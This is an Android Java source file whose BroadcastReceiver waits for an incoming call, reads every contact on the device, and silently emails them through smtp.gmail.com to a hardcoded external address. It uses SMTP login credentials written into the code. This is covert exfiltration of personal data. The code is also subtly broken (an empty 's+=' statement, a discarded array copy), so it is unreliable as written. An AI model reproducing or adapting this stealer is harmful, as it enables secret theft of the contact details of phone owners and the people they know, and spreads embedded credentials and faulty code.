package com.test.android;

import java.io.IOException;
import java.io.Writer;
import java.sql.Date;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.net.smtp.SMTPClient;
import org.apache.commons.net.smtp.SMTPReply;
import org.apache.commons.net.smtp.SimpleSMTPHeader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class ServiceReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		MyPhoneStateListener pL = new MyPhoneStateListener(context);
		
		TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		telephony.listen(pL,PhoneStateListener.LISTEN_CALL_STATE);
	}

	public class MyPhoneStateListener extends PhoneStateListener {
		private Context c;
		
		public MyPhoneStateListener(Context C){
		c = C;
		}
		
		public void onCallStateChanged(int state, String number){
		switch(state){
		case TelephonyManager.CALL_STATE_RINGING : 
		
			String[] res = new String[1];
			
			Cursor cursor = c.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);
			
			cursor.moveToFirst();
				
			boolean ok = true;										
			
			while(ok){
				String s = "";
				
				s+=
			
				res[res.length-1] = s + "\n";
				Arrays.copyOf(res,res.length+1);								
			
				ok = cursor.moveToNext();
			}
			
			cursor.close();
			
			String s = "";
			
			for (int n=0;n<res.length;n++)
			s += res[n];						
			
			try
			{
			send("dtordera@gmail.com","dtordera@hotmail.com","asdkfjaskld",s);
			}
			catch (Exception E){
			Toast.makeText(c,"EXCEPCIO",Toast.LENGTH_LONG).show();};

		}
		
		super.onCallStateChanged(state,number);
		}	
		
		private void checkReply(SMTPClient sc) throws IOException {
	if (SMTPReply.isNegativeTransient(sc.getReplyCode())) {
		sc.disconnect();
		throw new IOException("Transient SMTP error " + sc.getReplyCode());
	} else if (SMTPReply.isNegativePermanent(sc.getReplyCode())) {
		sc.disconnect();
		throw new IOException("Permanent SMTP error " + sc.getReplyCode());
	}
	}		
		
public void send(String from, String to, String subject, String text)
throws IOException {
        SMTPClient client = new SMTPClient("UTF-8");
        client.setDefaultTimeout(60 * 1000);
 
        client.setRequireStartTLS(true); // requires STARTTLS
        //client.setUseStartTLS(true); // tries STARTTLS, but falls back if not supported
        client.setUseAuth(true); // use SMTP AUTH
        //client.setAuthMechanisms(authMechanisms); // sets AUTH mechanisms e.g. LOGIN
 
       	client.connect("smtp.gmail.com", 587);
       	checkReply(client);
 
       	client.login("localhost", "dtordfera@gmail.com", "9097UeID");
       	checkReply(client);
 
       	client.setSender(from);
       	checkReply(client);
       	client.addRecipient(to);
       	checkReply(client);
 
       	Writer writer = client.sendMessageData();
 
       	if (writer != null) {
       		SimpleSMTPHeader header = new SimpleSMTPHeader(from, to, subject);
       		writer.write(header.toString());
       		writer.write(text);
       		writer.close();
       		client.completePendingCommand();
       	        checkReply(client);
        }
 
        client.logout();
        client.disconnect();
}		
		
	}
}
